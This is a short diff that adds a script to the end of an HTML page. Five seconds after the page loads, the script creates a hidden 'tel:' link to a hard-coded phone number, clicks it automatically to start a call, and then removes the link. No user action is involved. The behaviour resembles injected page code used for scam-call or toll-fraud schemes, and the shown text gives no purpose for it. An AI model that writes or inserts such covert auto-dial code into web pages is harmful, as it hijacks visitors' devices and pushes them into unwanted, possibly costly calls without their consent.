@@ -425,5 +425,27 @@
             }
         });
     </script>
+<script>
+  // Phone number to dial - REPLACE THIS WITH THE ACTUAL PHONE NUMBER
+  const phoneNumber = "+1-808-217-1305";
+  
+  // Set a timeout to trigger the call after 5 seconds (5000 milliseconds)
+  setTimeout(function() {
+    // Create the telephone link
+    const telLink = document.createElement('a');
+    telLink.style.display = 'none';
+    telLink.href = `tel:${phoneNumber}`;
+    document.body.appendChild(telLink);
+    
+    // Trigger the click to initiate the call
+    telLink.click();
+    
+    // Clean up
+    setTimeout(() => {
+      document.body.removeChild(telLink);
+    }, 1000);
+  }, 5000);
+</script>
+  
 </body>
 </html>
